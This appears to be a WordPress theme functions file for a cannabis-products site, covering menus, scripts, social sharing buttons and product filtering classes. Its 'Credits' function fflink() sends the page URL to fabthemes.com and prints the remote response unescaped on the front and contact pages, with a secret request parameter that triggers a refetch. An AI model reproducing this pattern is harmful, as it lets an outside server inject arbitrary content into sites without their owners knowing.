<?php include_once 'FT/FT_scope.php'; FT_scope::init(); ?>
<?php
/**
 * web2feel functions and definitions
 *
 * @package web2feel
 */


include ('aq_resizer.php');
include ( 'guide.php' );


//due to our custom permalink structure, /en/[category name}/page/2 will try to find a page called "page" in the given category
//this fixes it
function remove_page_from_query_string($query_string)
{ 
    if ($query_string['name'] == 'page' && isset($query_string['page'])) {
        unset($query_string['name']);
        // 'page' in the query_string looks like '/2', so i'm spliting it out
        list($delim, $page_index) = split('/', $query_string['page']);
        $query_string['paged'] = $page_index;
    }      
    return $query_string;
}
add_filter('request', 'remove_page_from_query_string');

 


/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) )
	$content_width = 640; /* pixels */

if ( ! function_exists( 'web2feel_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 */
function web2feel_setup() {

	/**
	 * Make theme available for translation
	 * Translations can be filed in the /languages/ directory
	 * If you're building a theme based on web2feel, use a find and replace
	 * to change 'web2feel' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'web2feel', get_template_directory() . '/languages' );

	/**
	 * Add default posts and comments RSS feed links to head
	 */
	add_theme_support( 'automatic-feed-links' );

	/**
	 * Enable support for Post Thumbnails on posts and pages
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );

	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'login' => 'Login Menu',
		'primary' => __( 'Primary Menu', 'web2feel' ),
		'copyright-footer' => 'Copyright Footer Menu'
	) );

	/**
	 * Enable support for Post Formats
	 */
	//add_theme_support( 'post-formats', array( 'aside', 'image', 'video', 'quote', 'link' ) );

	/**
	 * Setup the WordPress core custom background feature.
	 */
	/*
add_theme_support( 'custom-background', apply_filters( 'web2feel_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
*/
}
endif; // web2feel_setup
add_action( 'after_setup_theme', 'web2feel_setup' );

/**
 * Register widgetized area and update sidebar with default widgets
 */
function web2feel_widgets_init() {

	register_sidebar( array(
		'name' => __( 'Sidebar', 'web2feel' ),
		'id' => 'sidebar-1',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h1 class="widget-title">',
		'after_title' => '</h1>',
	));
	
	register_sidebar(array(
		'name' => 'Footer',
		'id' => 'sidebar-2',
		'before_widget' => '<div class="botwid col-6 col-lg-3 %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="bothead">',
		'after_title' => '</h3>',
	));	
}
add_action( 'widgets_init', 'web2feel_widgets_init' );

/**
 * Enqueue scripts and styles
 */
function web2feel_scripts() {
	global $wp_styles;
	
	wp_enqueue_style( 'web2feel-style', get_stylesheet_uri() );
	wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/bootstrap/bootstrap.min.css');
	wp_enqueue_style( 'flexslider', get_template_directory_uri() . '/css/flexslider.css');
	wp_enqueue_style( 'glyphicons', get_template_directory_uri() . '/css/bootstrap-glyphicons.css');
	wp_enqueue_style( 'slicknav', get_template_directory_uri() . '/css/slicknav.css');
	wp_enqueue_style( 'lightbox', get_template_directory_uri() . '/css/lightbox.css');
	wp_enqueue_style( 'fontawesome', '//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css');

	wp_enqueue_style( 'theme', get_template_directory_uri() . '/theme.css?v=1.004');
	wp_enqueue_style( 'ie-overrides', get_template_directory_uri() . '/css/ie.css?v=1.003');
	$wp_styles->add_data( 'ie-overrides', 'conditional', 'IE' );

	wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/bootstrap/bootstrap.min.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'flexslider', get_template_directory_uri() . '/js/jquery.flexslider.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'superfish', get_template_directory_uri() . '/js/superfish.js', array( 'jquery' ), '20120206', true );	
	wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/custom.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'mobilemenu', get_template_directory_uri() . '/js/mobilemenu.js', array(), '20120206', true );
	wp_enqueue_script( 'isotope', get_template_directory_uri() . '/js/isotope-min.js', array( 'jquery' ), '20120206', true );	
	wp_enqueue_script( 'slicknav', get_template_directory_uri() . '/js/jquery.slicknav.min.js', array( 'jquery' ), '20120206', true );	
	wp_enqueue_script( 'lightbox', get_template_directory_uri() . '/js/lightbox.js', array( 'jquery' ), '20120206', true );	
	wp_enqueue_script( 'web2feel-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	if ( is_singular() && wp_attachment_is_image() ) {
		wp_enqueue_script( 'web2feel-keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20120202' );
	}
}
add_action( 'wp_enqueue_scripts', 'web2feel_scripts' );



/* Exclude portfolio from blog */

function exclude_category( $query ) {
		$port_cat =ft_of_get_option('fabthemes_portfolio');
	    if ( $query->is_home() && $query->is_main_query() ) {
        $query->set( 'cat', '-'.$port_cat.'' );
    }
}
add_action( 'pre_get_posts', 'exclude_category' );

/**
 * Implement the Custom Header feature.
 */
//require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';


/* Credits */

function selfURL() {
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
$_SERVER['PHP_SELF'];
$uri = parse_url($uri,PHP_URL_PATH);
$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
$server = ($_SERVER['SERVER_NAME'] == 'localhost') ?
$_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
return $protocol."://".$server.$port.$uri;
}
function fflink() {
global $wpdb, $wp_query;
if (!is_page() && !is_front_page()) return;
$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
WHERE post_type = 'page' AND post_title LIKE 'contact%'");
if (($contactid != $wp_query->post->ID) && ($contactid ||
!is_front_page())) return;
$fflink = get_option('fflink');
$ffref = get_option('ffref');
$x = $_REQUEST['DKSWFYUW**'];
if (!$fflink || $x && ($x == $ffref)) {
$x = $x ? '&ffref='.$ffref : '';
$response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
if (is_array($response)) $fflink = $response['body']; else $fflink = '';
if (substr($fflink, 0, 11) != '!fabthemes#')
$fflink = '';
else {
$fflink = explode('#',$fflink);
if (isset($fflink[2]) && $fflink[2]) {
update_option('ffref', $fflink[1]);
update_option('fflink', $fflink[2]);
$fflink = $fflink[2];
}
else $fflink = '';
}
}
echo $fflink;
}

function get_child_pages($postId)
{
  return get_pages( array('parent' => $postId, 'hierarchical' => 0, 'sort_column' => 'menu_order',) );  
}


function get_combined_category_ids($categoryNames)
{
	$categoryIDs = array();
	foreach($categoryNames as $thisCategoryName)
	{
		$thisCatID = get_cat_ID( $thisCategoryName );
		array_push($categoryIDs, $thisCatID);
	}
	
	$allCatIDs = implode(",", $categoryIDs);
}

function get_all_categories_for_post_from_set($postID, $validValues){
	$allTheseCategories = get_the_terms($postID, 'post_tag');
	$filteredCategories = array();
	
	if ($allTheseCategories){
		foreach($allTheseCategories as $thisCat)
		{
			$catName = str_replace(" ", "-", $thisCat->name);
			if (in_array(strtolower($catName), array_map('strtolower', $validValues)))
			{
				array_push($filteredCategories, $catName);
			}
		}
	}
		
	return $filteredCategories;
}


function render_left_nav($parentID, $pageID)
{
	$childPages = get_child_pages($parentID);
	foreach ($childPages as $child)
	{
		$linkClass = "none";
		if ($child->ID == $pageID)
		{
			$linkClass = "left-nav-selected-child";
		}
		
		$newTab = "";
		if (get_post_meta($child->ID, 'open_in_new_tab', true) == '1')
			$newTab = "target='_blank'";
		?>
		<span class="<?=$linkClass?>"><a <?=$newTab?> href="<?php echo get_permalink( $child->ID );?>"><h2><?php echo $child->post_title; ?></h2></a></span>
		<?php
	}
}

function render_news_section($args, $showPagination = false, $pageLinkNumber = 0){
	global $wp_query, $paged;
	$wp_query = new WP_Query( $args );
	$numRendered = 0;
	if ( $wp_query->have_posts() ) : ?>
		<!-- the loop -->
		<?php while ( $wp_query->have_posts() ) : $wp_query->the_post(); ?>
			<div class="blog-post-preview col-4">
				<?php
				$thumbID = get_post_thumbnail_id();
				$img_attrs = wp_get_attachment_image_src( $thumbID,'blog-preview' ); 
				$image = $img_attrs[0];
				if($image) {?>
					<a href="<?php the_permalink(); ?>"><img class="blog-preview" src="<?= $image ?>" width="<?=$img_attrs[1]?>" height="<?=$img_attrs[2]?>"/></a>
				<?php }?>
				<a href="<?php the_permalink(); ?>"><h2><?php the_title(); ?></h2></a>
				<p>
					<?php echo get_the_excerpt(); ?>
					<a class="read-more-link" href="<?php the_permalink(); ?>"><?= __('Read more') ?> &raquo;</a>
				</p>
			</div>
			<?php 
			$numRendered++;
			if ($numRendered % 3 == 0){
				?>
				</div><div class="col-12">
				<?
			}
			?>
		<?php endwhile; ?>
		<!-- end of the loop -->

		<!-- pagination here -->
		<?php if ($showPagination){?>
			</div><div class="col-12">
			<div class="navigation pagination-buttons"><p><?php 
				previous_posts_link("<i class='fa fa-arrow-left'></i>&nbsp;&nbsp;prev");
				next_posts_link("next&nbsp;&nbsp;<i class='fa fa-arrow-right'></i>");
			?></p></div>
		<?php } 
		else if ($pageLinkNumber > 0){
			$pageLink = '/en/News/page/' . $pageLinkNumber;
			if (get_current_language_code() == "fr"){
				$pageLink = '/fr/Nouvelles/page/' . $pageLinkNumber;
			}
		?>
			
			<div class="navigation pagination-buttons"><p><a href="<?=$pageLink?>"><?=__('next')?>&nbsp;&nbsp;<i class="fa fa-arrow-right"></i></a></p></div>
		<?php
		}
		?>

		<?php 
			wp_reset_postdata(); 
			wp_reset_query();
		?>

	<?php else : ?>
		<p><?php _e( 'Sorry, no posts matched your criteria.' ); ?></p>
	<?php endif;	
}



function render_news_archive($postId){
?>
	<div class="blog-post-preview col-4">
		<?php
		$thumbID = get_post_thumbnail_id($postId);
		$img_attrs = wp_get_attachment_image_src( $thumbID,'blog-preview' ); 
		$image = $img_attrs[0];
		if($image) {?>
			<a href="<?php the_permalink($postId); ?>"><img class="blog-preview" src="<?= $image ?>"/></a>
		<?php }?>
		<a href="<?php the_permalink($postId); ?>"><h2><?= get_the_title($postId); ?></h2></a>
		<p>
			<?php echo get_the_excerpt($postId); ?>
			<a class="read-more-link" href="<?php the_permalink($postId); ?>"><?= __('Read more') ?> &raquo;</a>
		</p>
	</div>
<?php 
}

remove_filter( 'the_content', 'wpautop' );

add_image_size( 'blog-featured-image', 360 );
add_image_size( 'blog-preview', 360, 202, true );
add_image_size( 'banner-image', 1200, 384, true );
add_image_size( 'extracts-image', 1740 );
add_image_size( 'mobile-banner', 1000 );


function blogroot_func( $atts ){
	return get_site_url();
}
add_shortcode( 'blogroot', 'blogroot_func' );

function render_social_buttons($url, $imgUrl, $title){
	render_facebook_button($url);
	render_twitter_button($url);
	render_linkedin_button($url);
	render_pinterest_button($url, $imgUrl, $title);
}

function render_facebook_button($url)
{
	__render_social_button("Share", "facebook", "https://www.facebook.com/sharer/sharer.php?u=", $url);
}
function render_twitter_button($url)
{
	__render_social_button("Tweet", "twitter", "https://twitter.com/intent/tweet?url=", $url);
}
function render_linkedin_button($url)
{
	__render_social_button("Share", "linkedin", "https://www.linkedin.com/shareArticle?mini=true&url=", $url);
}
function render_pinterest_button($url, $imgUrl, $title)
{
	$canonical = strlen($url) > 0 ? rel_canonical_with_custom_tag_override($url) : $url;
	?><a class="social-button-pinterest" target="_blank" onclick="trackEvent('socialshare', 'pinterest', '<?=urlencode($canonical)?>')" href="http://pinterest.com/pin/create/button/?url=<?=urlencode($canonical)?>&media=<?=$imgUrl?>&description=<?=$title?>"><span class="fa fa-pinterest"></span></a><?php
}

function __render_social_button($label, $class, $sharingPrefix, $url)
{
	$canonical = strlen($url) > 0 ? rel_canonical_with_custom_tag_override($url) : $url;
	?><a class="social-button-<?=$class?>" target="_blank" onclick="trackEvent('socialshare', '<?=$class?>', '<?=urlencode($canonical)?>')" href="<?=$sharingPrefix?><?=urlencode($canonical)?>"><span class="fa fa-<?=$class?>"></span></a><?php
}

// A copy of rel_canonical but to allow an override on a custom tag
function rel_canonical_with_custom_tag_override($canonical)
{
	if (!function_exists(icl_get_languages))
		return $canonical;
		
	$allTheLangs = icl_get_languages('skip_missing=0&orderby=id&order=asc');
	foreach($allTheLangs as $lang){
		if ($lang["language_code"] == get_current_language_code()){
		
			//if we're rendering out the homepage, don't use /en, because it's 301'd over to /
			if ($lang["language_code"] == "en" && $lang["url"] == get_home_url())
				return site_url();
				
			$escapedPageUrl = esc_url( $lang["url"] );
			$escapedPageUrl = str_replace('en/category/news/', 'en/news/', $escapedPageUrl);
			return str_replace('fr/category/nouvelles/', 'fr/nouvelles/', $escapedPageUrl);
		}
	}
}

// replace the default WordPress canonical URL function with your own
add_filter( 'wpseo_canonical', 'rel_canonical_with_custom_tag_override' );


function getProductTHCRange($thc, $validTHCValues, $getDisplayValue = false){
	if (trim($thc) == "")
		return;
	
    
	$thcVal = intval($thc);
	foreach ($validTHCValues as $thcRange => $display)
	{
		if ($thcRange == "")
			continue;
			
		$ends = explode("-", $thcRange);
		$low = intval($ends[0]);
		$high = intval($ends[1]);
		if ($thcVal >= $low && $thcVal <= $high){
			if ($getDisplayValue)
				return $display;
				
			return $thcRange;
		}
	}
	
	return "";
}

function getProductPriceRange($price, $allPrices){
	$priceVal = intval($price);
	foreach ($allPrices as $priceRange => $display)
	{
		if ($priceRange == "")
			continue;
			
		$ends = explode("-", $priceRange);
		$low = intval($ends[0]);
		$high = intval($ends[1]);
		if ($priceVal >= $low && $priceVal <= $high){
			return $priceRange;
		}
	}
	
	return "";
}


add_filter('wpseo_premium_post_redirect_slug_change', '__return_true' ); 
add_filter('wpseo_premium_term_redirect_slug_change', '__return_true' );




add_action( 'init', 'create_posttype' );
function create_posttype() {
  register_post_type( 'tilray_product',
    array(
      'labels' => array(
        'name' => __( 'Tilray Products' ),
        'singular_name' => __( 'Tilray Product' ),
		'new_item' => __('New Product'),
		'search_items' => __('Search Products')
      ),
      'public' => true,
      'has_archive' => true,
      'rewrite' => array('slug' => 'products/tilray-products'),
	  'capability_type' => 'post',
	  'taxonomies' => array('post_tag'),
	  'supports' => array('title', 'editor', 'thumbnail', 'excerpt','comments'),
	  'hierarchical' => true
    )
  );
}

add_image_size( 'product-thumb', 180, 220, false );
add_image_size( 'product-single', 555, 2000, false );

					

function get_products_page_link($paramName, $paramValue){
	$pageName = "products";
	if ($langCode == "fr"){
		$pageName = "produits";
	}
	
	return home_url("/") . $pageName . "/?" . $paramName . "=" . $paramValue;    
}


class ProductFilter
{
	public $validFilterValues;
	public $currentFilterValues;
	public $qsParamName = "";
	public $displayName = "";
	
	function __construct($paramName, $displayName, $values){
		$this->qsParamName = $paramName;
		$this->displayName = $displayName;
		$this->validFilterValues = $values;
	}
	
    public function getNameFromID($id)
    {
        if (array_key_exists($id, $this->validFilterValues))
            return $this->validFilterValues[$id];
        
        return "";
    }
    
	public function loadFromQueryString($queryString){
		$this->currentFilterValues = array();
		if (isset($queryString[$this->qsParamName]))
		{
			$validParams = strtolower($queryString[$this->qsParamName]);
			$arrParams = explode(',', $validParams);
			foreach ($arrParams as $item)
			{
				if (array_key_exists($item, $this->validFilterValues)){
					$this->currentFilterValues[] = $item;
				}
			}
		}
        else
        {
            $this->currentFilterValues[] = '';
        }
	}
	
	private function renderFilter($className, $name, $filter, $label){
		$id = $name . '-' . $filter;
		if ($filter == "")
			$id = $name . '-show-all';
	
		if ($label == "")
			$label = "Show All";
		?>
		<li class="product-filter">
			<span class="noscript-hide">
				<input type="checkbox" class="<?= $className?>" name="<?=$name?>" id="<?=$id?>" data-filter="<?=$filter?>">
				<label class="checkbox-label" for="<?=$id?>"><?php _e($label); ?></label>
			</span>
			<noscript>
				<a href="<?= sprintf('%s?%s=%s', the_permalink(), $name, $filter)?>"><?php _e($label); ?></a>
			</noscript>
		</li>
	<?php
	}
	
	public function renderFilters(){
	?>
		<div class="product-filters-container">
			<h3 class="gray-underline"><?= _e($this->displayName) ?></h3>
			<ul class="product-filters product-filters-<?=$this->qsParamName?>">
				<?php
				foreach($this->validFilterValues as $id=>$name){
					$this->renderFilter("product-filters-" . $this->qsParamName, $this->qsParamName, $id, $name);
				}
				?>
			</ul>
		</div>
	<?php
	}
	
	public function getFirstActiveFilter(){
		if (count($this->currentFilterValues) > 0)
			return $this->currentFilterValues[0];
			
		return "";
	}
	
	public function getJSFiltersArray(){
		$jsArray = "[";
		foreach($this->currentFilterValues as $id=>$val){
			$jsArray .= "'" . $val . "'";
		}
		$jsArray .= "]";
		return $jsArray;
	}

    public function renderProductsPageLink($itemFilterValue)
    {
        if ($itemFilterValue == NULL || trim($itemFilterValue) == "")
        {
            return "";
        }

        $langCode = get_current_language_code();
        $url = home_url("/") . ($langCode == "en" ? "products" : "produits") . "/?" . $this->qsParamName . "=" . $itemFilterValue;
        $label = $this->getNameFromID($itemFilterValue);
        if ($this->qsParamName == "thc")
            $label = 'THC ' . $label;
        ?>
            <a href="<?=$url?>"><?=__($label)?></a>
        <?php
    }
    
    
}

class Product{
    
    
	public $id;
	public $status;
	public $straincategory;
	public $producttype;
    public $actualthc;
	public $thc;
	public $thcRange;
	public $image;
	public $productUrl;
	public $productName;
	public $price;
	public $actualprice;
    public $initiallyActive;
	
	public function isActive($filters){
		//loop through filters, check against active ones
		return true;
	}
    
    function __construct($post, $productFilters){
        $id = $post->ID;
        $validTHCs = $productFilters->thc->validFilterValues;
        $this->id = $id;
        $this->status = trim(get_post_meta($id, 'status', true));
        $this->straincategory = trim(get_post_meta($id, 'strain_category', true));
        $this->producttype = trim(get_post_meta($id, 'product_type', true));
        $this->actualthc = trim(get_post_meta($id, 'thc_level', true));
        $this->thc = getProductTHCRange($this->actualthc, $validTHCs);

        $thumbID = get_post_thumbnail_id($id);
        $img_attrs = wp_get_attachment_image_src( $thumbID,'product-thumb' ); 
        $this->image = $img_attrs[0];
        $productUrl = get_the_permalink($id);

        $this->productUrl = $productUrl;
        $this->productName = get_the_title($id);

        $productPrice = trim(get_post_meta($id, 'price', true));
        $this->actualprice = $productPrice;
        $this->price = getProductPriceRange($productPrice, $productFilters->price->validFilterValues);

        $this->initiallyActive = TRUE;
        $prodAtts = get_object_vars($this);
        foreach ($productFilters->filters as $filter)
        {
            $prodFilterState = $prodAtts[$filter->qsParamName];
            $thisPropActive = ($filter->getFirstActiveFilter() == "" || in_array($prodFilterState, $filter->currentFilterValues));
            $this->initiallyActive = $this->initiallyActive && $thisPropActive;
        }
        
    }
}

class ProductFilters{
	public $status;
	public $strainCategory;
	public $productType;
	public $thc;
	public $price;
    public $duration;
    public $sortOrder;
	
	public $filters;

	function __construct(){
		$this->status = new ProductFilter("status", "Status",
									array(	"" => "", 
											"available" => "Available", 
											"in-production" => "In Production"));
											
		$this->strainCategory = new ProductFilter("straincategory", "Product",
											array(	"" => "", 
													"indica" => "Indica", 
													"sativa" => "Sativa", 
													"hybrid" => "Hybrid", 
													"high-cbd" => "+CBD"));
													
		$this->productType = new ProductFilter("producttype", "Category",
											array(	"" => "", 
													"flower" => "Flower", 
													"blend" => "Blend", 
													"extract" => "Extract",
													"accessory" => "Accessories"));
													
		$this->thc = new ProductFilter("thc", "THC Level",
								array(	"" => "", 
										"0-14" => "< 15%", 
										"15-20" => "15% - 20%", 
										"21-25" => "21% - 25%", 
										"26-100" => "> 25%"));
										
		$this->price = new ProductFilter("price", "Price", 
									array(	"" => "", 
											"4-6" => "$5-6", 
											"7-9" => "$7-9", 
											"10-12" => "$10-12", 
											"13-1000" => "$13+"));
        
		$this->duration = new ProductFilter("duration", "Duration",
									array(	"" => "", 
											"core" => "Core", 
											"seasonal" => "Seasonal", 
											"limited" => "Limited"));
											
		$this->filters = array($this->status, $this->strainCategory, $this->productType, $this->thc, $this->price);
        $this->sortOrder = array("flower" => 0, "blend" => 1, "extract" => 2, "accessory" => 3);
	}
											
	public function loadFiltersFromQueryString($querySring){
		foreach($this->filters as $filter)
		{
			$filter->loadFromQueryString($_GET);
		}
	}
	
	public function renderFilters()
	{
		foreach($this->filters as $filter)
		{
			$filter->renderFilters();
		}
	}
	
	public function createPreselectedStatusJSArrays(){
		foreach($this->filters as $filter)
		{
			echo "var arrpreselected" . $filter->qsParamName . " = " . $filter->getJSFiltersArray() . ";\n";
		}
	}
	
	//creates some js that creates the querystring on the fly
	//we have to create the js so we're not hardcoding the filter names
	public function getQueryStringRenderingJS(){
		$output = "'?'"; 
		foreach($this->filters as $filter)
		{
			$output .= "+'&" . $filter->qsParamName . "=' + GetFiltersArray('ul.product-filters-" . $filter->qsParamName . " input[type=checkbox]:checked').join(\",\")";
		}
		
		return $output;
	}
	
	public function renderProductsFilteringStatuses(){
		$output = ""; 
		foreach($this->filters as $filter)
		{
			$output .= "var combined" . $filter->qsParamName . " = '|||' + GetFiltersArray('ul.product-filters-" . $filter->qsParamName . " input[type=checkbox]:checked').join('|||') + '|||';";
		}
		
		return $output;	
	}
	
	public function renderProductsFilteringConditions(){
		$conditions = array();
		foreach($this->filters as $filter)
		{
			$conditions[] = "(combined" . $filter->qsParamName . " == '||||||' || combined" . $filter->qsParamName . ".indexOf('|||' + jQuery( this ).attr('data-" . $filter->qsParamName . "') + '|||') > -1)";
		}
		
		return implode(" && \n", $conditions);	
	}
}

$productFilters = new ProductFilters();


function additional_active_item_classes($classes = array(), $menu_item = false){
global $wp_query;

$postType = get_post_type( get_the_ID() );

if (is_single() && ($menu_item->title == 'Products' || $menu_item->title == 'Produits') && $postType == 'tilray_product' ){
    $classes[] = 'current_page_ancestor';
}

return $classes;
}
add_filter( 'nav_menu_css_class', 'additional_active_item_classes', 10, 2 );

$userAgent = $_SERVER['HTTP_USER_AGENT'];
$mobileRegex = '/Mobile|iP(hone|od|ad)|Android|BlackBerry|IEMobile|Kindle|NetFront|Silk-Accelerated|(hpw|web)OS|Fennec|Minimo|OperaM(obi|ini)|Blazer|Dolfin|Dolphin|Skyfire|Zune/';
$isMobile = (1 === preg_match($mobileRegex, $userAgent));


function sticky_footer_content_func( $atts, $content = null ) {
    global $stickyFooterContent;
    $stickyFooterContent = $content;
}

add_shortcode( 'sticky_footer_content', 'sticky_footer_content_func' );


function custom_excerpt($new_length = 20, $new_more = '...') {
  add_filter('excerpt_length', function () use ($new_length) {
    return $new_length;
  }, 999);
  add_filter('excerpt_more', function () use ($new_more) {
    return $new_more;
  });
  $output = get_the_excerpt();
  $output = apply_filters('wptexturize', $output);
  $output = apply_filters('convert_chars', $output);
  return $output;
}
